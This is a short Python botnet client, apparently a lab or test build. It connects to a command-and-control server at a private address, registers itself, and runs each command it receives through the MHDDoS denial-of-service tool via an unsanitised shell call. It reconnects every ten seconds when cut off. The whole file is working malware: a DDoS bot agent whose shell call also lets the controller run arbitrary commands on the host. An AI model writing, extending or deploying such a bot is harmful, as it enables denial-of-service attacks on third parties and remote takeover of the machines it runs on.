#!/usr/bin/env python3

import sys
import asyncio
import time
import subprocess
import os

CUR_DIR = os.path.dirname(os.path.realpath(__file__))
MHDDoS = os.sep + 'MHDDoS' + os.sep + 'start.py'
#  MHDDoS = '/home/frankwu/code/' + 'MHDDoS' + os.sep + 'start.py'
TEST_CNC = "192.168.100.4"
TEST_CNC_PORT = 9999

async def start_bot():
    bot_name = os.path.basename(__file__)
    # change IP to cnc server
    try:
        reader, writer = await asyncio.wait_for(asyncio.open_connection(TEST_CNC, TEST_CNC_PORT),
                                                timeout=5)
    except asyncio.TimeoutError:
        print('connect timeout')
        return
    reg_cmd = f'register {bot_name}'
    writer.write(reg_cmd.encode())
    await writer.drain()
    print('Connected to C&C Server')
    while True:
        data = await reader.read(4096)
        if not data:
            break
        message = data.decode()
        print(f"Command received from C&C Server: {message}")
        attack_para = message.split(' ',1)[1]
        print(f'attack para: {attack_para}')
        attack_cmd = f'python3 {MHDDoS} {attack_para}'
        print(f'attack cmd: {attack_cmd}')
        result = subprocess.run(attack_cmd, shell=True, capture_output=True, text=True)
        print(f'result: {result.stdout}')

def main():
    while True:
        try:
            asyncio.run(start_bot())
        finally:
            print('bot is disconected, will restart again')
            time.sleep(10)

if __name__ == "__main__":
    main()
